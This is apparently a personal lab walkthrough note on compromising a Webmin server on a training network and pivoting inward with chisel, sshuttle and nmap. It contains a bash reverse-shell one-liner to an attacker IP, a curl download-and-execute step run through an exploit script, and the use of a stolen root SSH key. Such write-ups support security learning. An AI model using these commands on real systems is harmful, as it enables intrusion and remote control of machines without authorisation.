---

---
- **Got RCE on port 10000 (Webmin, See [[10.200.81.200]])**
- Let's get a **shell**:
	- After trying multiple shells, **`bash` shell worked**
	- `nc -lnvp 9002`
	- `/bin/bash -i >& /dev/tcp/10.50.55.136/9002 0>&1` > shell.sh
	- `python3 -m http.server`
	- `python3 webmin_exploit.py 10.200.57.200 10000 'curl 10.50.55.136:8000/bash_shell.sh -o shell.sh'
	- `python3 webmin_exploit.py 10.200.57.200 10000 'bash shell.sh'`
	- ![[Pasted image 20250402162403.png]]
# Getting id_rsa
---
- Since `ssh` was enabled, we can get the **private key of root user for a better shell**:
- ![[Pasted image 20250402162918.png]]
- Copy it in a file
- `chmod 600 prod_root_id_rsa.pem `
- `ssh root@10.200.81.200 -i prod_root_id_rsa.pem `
- 

Some **possible useful information** found in `anaconda-ls.cfg` in `/root` directory: 
![[Pasted image 20250402163335.png]]

# Setup chisel, proxychains and sshuttle
---
- On prod server:
	- `./chisel_1.7.3_linux_amd6 client --fingerprint HB41FfM28HLUFZlrvRhBHxvIHDacoolHczCOU3Sx+7I= 10.200.81.200:9999 R:socks`
- On kali:
	- `chisel server --socks5 --reverse -p 9999`
- Add **foxyproxy ip**
	- ![[Pasted image 20250404121940.png]]
- `sshuttle -r root@10.200.81.200 10.200.81.0/24 --ssh-cmd "ssh -i prod_root_id_rsa.pem" -x 10.200.81.200` => **For direct access**

# Finding internal IPs
---
- Transfer the `nmap` binary and run `-sn` scan for IPs only
	- ![[Pasted image 20250403121821.png]]